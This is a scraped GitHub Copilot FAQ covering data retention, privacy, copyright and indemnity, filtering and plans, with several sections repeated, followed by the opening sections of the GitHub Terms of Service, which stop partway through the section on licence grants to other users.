**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.
3. Authentication with SAML single sign-on (SSO) available for organizations using GitHub Enterprise Cloud.

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in [GitHub Advanced Security](https://github.com/enterprise/advanced-security).

#### What if I do not want Copilot?

Copilot is entirely optional and requires you to opt in before gaining access. You can easily configure its usage directly in the editor, enabling or disabling it at any time. Additionally, you have control over which file types Copilot is active for.

#### How do I control access to Copilot in my company?

Access to Copilot Business and Enterprise is managed by your GitHub Administrator. They can control access to preview features, models, and set Copilot policies for your organization. Additionally, you can use your network firewall to explicitly allow access to Copilot Business and/or block access to Copilot Pro or Free. For more details, refer to the [documentation](https://docs.github.com/en/copilot/managing-copilot/managing-github-copilot-in-your-organization/managing-access-to-github-copilot-in-your-organization).

### Plans & Pricing

#### What are the differences between the Free, Pro, Business, and Enterprise plans?

GitHub Copilot has multiple offerings for organizations and an offering for individual developers. All the offerings include both code completion and chat assistance. The primary differences between the organization offerings and the individual offering are license management, policy management, and IP indemnity.

Organizations can choose between GitHub Copilot Business and GitHub Copilot Enterprise. GitHub Copilot Business primarily features GitHub Copilot in the coding environment - that is the IDE, CLI and GitHub Mobile. GitHub Copilot Enterprise includes everything in GitHub Copilot Business. It also  adds an additional layer of customization for organizations and integrates into GitHub.com as a chat interface to allow developers to converse with Copilot  throughout the platform. GitHub Copilot Enterprise can index an organization’s codebase for a deeper understanding of the customer’s knowledge for more tailored suggestions and will offer customers access to fine-tuned custom, private models for code completion.

GitHub Copilot Pro is designed for individual developers, freelancers, students, educators, and open source maintainers. The plan includes all the features of GitHub Copilot Business except organizational license management, policy management, and IP indemnity.

#### How can I upgrade my GitHub Copilot Free license to Copilot Pro?

If you're on the Free plan, you can upgrade to Pro through your [Copilot settings page](https://github.com/settings/copilot) or directly on the [Copilot marketing page](https://github.com/features/copilot).

#### What is included in GitHub Copilot Free?

GitHub Copilot Free users are limited to 2000 completions and 50 chat requests (including Copilot Edits).

#### Which plan includes GitHub Copilot Autofix?

GitHub Copilot Autofix provides contextual explanations and code suggestions to help developers fix vulnerabilities in code, and is included in GitHub Advanced Security and available to all public repositories.

### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

## [The GitHub Terms of Service](#the-github-terms-of-service)

Effective date: November 16, 2020

## [A. Definitions](#a-definitions)

**Short version:** *We use these basic terms throughout the agreement, and they have specific meanings. You should know what we mean when we use each of the terms. There's not going to be a test on it, but it's still useful information.*

1. An "Account" represents your legal relationship with GitHub. A “Personal Account” represents an individual User’s authorization to log in to and use the Service and serves as a User’s identity on GitHub. “Organizations” are shared workspaces that may be associated with a single entity or with one or more Users where multiple Users can collaborate across many projects at once. A Personal Account can be a member of any number of Organizations.
2. The “Agreement” refers, collectively, to all the terms, conditions, notices contained or referenced in this document (the “Terms of Service” or the "Terms") and all other operating rules, policies (including the GitHub Privacy Statement, available at [github.com/site/privacy](https://github.com/site/privacy)) and procedures that we may publish from time to time on the Website. Most of our site policies are available at [docs.github.com/categories/site-policy](/en/site-policy).
3. "Beta Previews" mean software, services, or features identified as alpha, beta, preview, early access, or evaluation, or words or phrases with similar meanings.
4. “Content” refers to content featured or displayed through the Website, including without limitation code, text, data, articles, images, photographs, graphics, software, applications, packages, designs, features, and other materials that are available on the Website or otherwise available through the Service. "Content" also includes Services. “User-Generated Content” is Content, written or otherwise, created or uploaded by our Users. "Your Content" is Content that you create or own.
5. “GitHub,” “We,” and “Us” refer to GitHub, Inc., as well as our affiliates, directors, subsidiaries, contractors, licensors, officers, agents, and employees.
6. The “Service” refers to the applications, software, products, and services provided by GitHub, including any Beta Previews.
7. “The User,” “You,” and “Your” refer to the individual person, company, or organization that has visited or is using the Website or Service; that accesses or uses any part of the Account; or that directs the use of the Account in the performance of its functions. A User must be at least 13 years of age. Special terms may apply for business or government Accounts (See [Section B(5): Additional Terms](#5-additional-terms)).
8. The “Website” refers to GitHub’s website located at [github.com](https://github.com/), and all content, services, and products provided by GitHub at or through the Website. It also refers to GitHub-owned subdomains of github.com, such as [education.github.com](https://education.github.com/) and [pages.github.com](https://pages.github.com/). These Terms also govern GitHub’s conference websites, such as [githubuniverse.com](https://githubuniverse.com/), and product websites, such as [electronjs.org](https://www.electronjs.org/). Occasionally, websites owned by GitHub may provide different or additional terms of service. If those additional terms conflict with this Agreement, the more specific terms apply to the relevant page or service.

## [B. Account Terms](#b-account-terms)

**Short version:** *Personal Accounts and Organizations have different administrative controls; a human must create your Account; you must be 13 or over; you must provide a valid email address; and you may not have more than one free Account. You alone are responsible for your Account and anything that happens while you are signed in to or using your Account. You are responsible for keeping your Account secure.*

### [1. Account Controls](#1-account-controls)

* Users. Subject to these Terms, you retain ultimate administrative control over your Personal Account and the Content within it.
* Organizations. The "owner" of an Organization that was created under these Terms has ultimate administrative control over that Organization and the Content within it. Within the Service, an owner can manage User access to the Organization’s data and projects. An Organization may have multiple owners, but there must be at least one Personal Account designated as an owner of an Organization. If you are the owner of an Organization under these Terms, we consider you responsible for the actions that are performed on or through that Organization.

### [2. Required Information](#2-required-information)

You must provide a valid email address in order to complete the signup process. Any other information requested, such as your real name, is optional, unless you are accepting these terms on behalf of a legal entity (in which case we need more information about the legal entity) or if you opt for a [paid Account](#k-payment), in which case additional information will be necessary for billing purposes.

### [3. Account Requirements](#3-account-requirements)

We have a few simple rules for Personal Accounts on GitHub's Service.

* You must be a human to create an Account. Accounts registered by "bots" or other automated methods are not permitted. We do permit machine accounts:
* A machine account is an Account set up by an individual human who accepts the Terms on behalf of the Account, provides a valid email address, and is responsible for its actions. A machine account is used exclusively for performing automated tasks. Multiple users may direct the actions of a machine account, but the owner of the Account is ultimately responsible for the machine's actions. You may maintain no more than one free machine account in addition to your free Personal Account.
* One person or legal entity may maintain no more than one free Account (if you choose to control a machine account as well, that's fine, but it can only be used for running a machine).
* You must be age 13 or older. While we are thrilled to see brilliant young coders get excited by learning to program, we must comply with United States law. GitHub does not target our Service to children under 13, and we do not permit any Users under 13 on our Service. If we learn of any User under the age of 13, we will [terminate that User’s Account immediately](#l-cancellation-and-termination). If you are a resident of a country outside the United States, your country’s minimum age may be older; in such a case, you are responsible for complying with your country’s laws.
* Your login may only be used by one person — i.e., a single login may not be shared by multiple people. A paid Organization may only provide access to as many Personal Accounts as your subscription allows.
* You may not use GitHub in violation of export control or sanctions laws of the United States or any other applicable jurisdiction. You may not use GitHub if you are or are working on behalf of a [Specially Designated National (SDN)](https://www.treasury.gov/resource-center/sanctions/SDN-List/Pages/default.aspx) or a person subject to similar blocking or denied party prohibitions administered by a U.S. government agency. GitHub may allow persons in certain sanctioned countries or territories to access certain GitHub services pursuant to U.S. government authorizations. For more information, please see our [Export Controls policy](/en/site-policy/other-site-policies/github-and-trade-controls).

### [4. Account Security](#4-account-security)

You are responsible for keeping your Account secure while you use our Service. We offer tools such as two-factor authentication to help you maintain your Account's security, but the content of your Account and its security are up to you.

* You are responsible for all content posted and activity that occurs under your Account (even when content is posted by others who have Accounts under your Account).
* You are responsible for maintaining the security of your Account and password. GitHub cannot and will not be liable for any loss or damage from your failure to comply with this security obligation.
* You will promptly notify GitHub by contacting us through the [GitHub Support portal](https://support.github.com/) if you become aware of any unauthorized use of, or access to, our Service through your Account, including any unauthorized use of your password or Account.

### [5. Additional Terms](#5-additional-terms)

In some situations, third parties' terms may apply to your use of GitHub. For example, you may be a member of an organization on GitHub with its own terms or license agreements; you may download an application that integrates with GitHub; or you may use GitHub to authenticate to another service. Please be aware that while these Terms are our full agreement with you, other parties' terms govern their relationships with you.

If you are a government User or otherwise accessing or using any GitHub Service in a government capacity, this [Government Amendment to GitHub Terms of Service](/en/site-policy/site-policy-deprecated/amendment-to-github-terms-of-service-applicable-to-us-federal-government-users) applies to you, and you agree to its provisions.

If you have signed up for GitHub Enterprise Cloud, the [Enterprise Cloud Addendum](/en/site-policy/site-policy-deprecated/github-enterprise-service-level-agreement) applies to you, and you agree to its provisions.

## [C. Acceptable Use](#c-acceptable-use)

**Short version:** *GitHub hosts a wide variety of collaborative projects from all over the world, and that collaboration only works when our users are able to work together in good faith. While using the service, you must follow the terms of this section, which include some restrictions on content you can post, conduct on the service, and other limitations. In short, be excellent to each other.*

Your use of the Website and Service must not violate any applicable laws, including copyright or trademark laws, export control or sanctions laws, or other laws in your jurisdiction. You are responsible for making sure that your use of the Service is in compliance with laws and any applicable regulations.

You agree that you will not under any circumstances violate our [Acceptable Use Policies](/en/site-policy/acceptable-use-policies/github-acceptable-use-policies) or [Community Guidelines](/en/site-policy/github-terms/github-community-guidelines).

## [D. User-Generated Content](#d-user-generated-content)

**Short version:** *You own content you create, but you allow us certain rights to it, so that we can display and share the content you post. You still have control over your content, and responsibility for it, and the rights you grant us are limited to those we need to provide the service. We have the right to remove content or close Accounts if we need to.*

### [1. Responsibility for User-Generated Content](#1-responsibility-for-user-generated-content)

You may create or upload User-Generated Content while using the Service. You are solely responsible for the content of, and for any harm resulting from, any User-Generated Content that you post, upload, link to or otherwise make available via the Service, regardless of the form of that Content. We are not responsible for any public display or misuse of your User-Generated Content.

### [2. GitHub May Remove Content](#2-github-may-remove-content)

We have the right to refuse or remove any User-Generated Content that, in our sole discretion, violates any laws or [GitHub terms or policies](/en/site-policy). User-Generated Content displayed on GitHub Mobile may be subject to mobile app stores' additional terms.

### [3. Ownership of Content, Right to Post, and License Grants](#3-ownership-of-content-right-to-post-and-license-grants)

You retain ownership of and responsibility for Your Content. If you're posting anything you did not create yourself or do not own the rights to, you agree that you are responsible for any Content you post; that you will only submit Content that you have the right to post; and that you will fully comply with any third party licenses relating to Content you post.

Because you retain ownership of and responsibility for Your Content, we need you to grant us — and other GitHub Users — certain legal permissions, listed in Sections D.4 — D.7. These license grants apply to Your Content. If you upload Content that already comes with a license granting GitHub the permissions we need to run our Service, no additional license is required. You understand that you will not receive any payment for any of the rights granted in Sections D.4 — D.7. The licenses you grant to us will end when you remove Your Content from our servers, unless other Users have forked it.

### [4. License Grant to Us](#4-license-grant-to-us)

We need the legal right to do things like host Your Content, publish it, and share it. You grant us and our legal successors the right to store, archive, parse, and display Your Content, and make incidental copies, as necessary to provide the Service, including improving the Service over time. This license includes the right to do things like copy it to our database and make backups; show it to you and other users; parse it into a search index or otherwise analyze it on our servers; share it with other users; and perform it, in case Your Content is something like music or video.

This license does not grant GitHub the right to sell Your Content. It also does not grant GitHub the right to otherwise distribute or use Your Content outside of our provision of the Service, except that as part of the right to archive Your Content, GitHub may permit our partners to store and archive Your Content in public repositories in connection with the [GitHub Arctic Code Vault and GitHub Archive Program](https://archiveprogram.github.com/).

### [5. License Grant to Other Users](#5-license-grant-to-other-users)

Any User-Generated Content you post publicly, including issues, comments, and contributions to other Users' repositories, may be viewed by others. By setting your repositories to be viewed publicly, you agree to allow others to view and "fork" your repositories (this means that others may make their own copies of Content from your repositories in repositories they control).

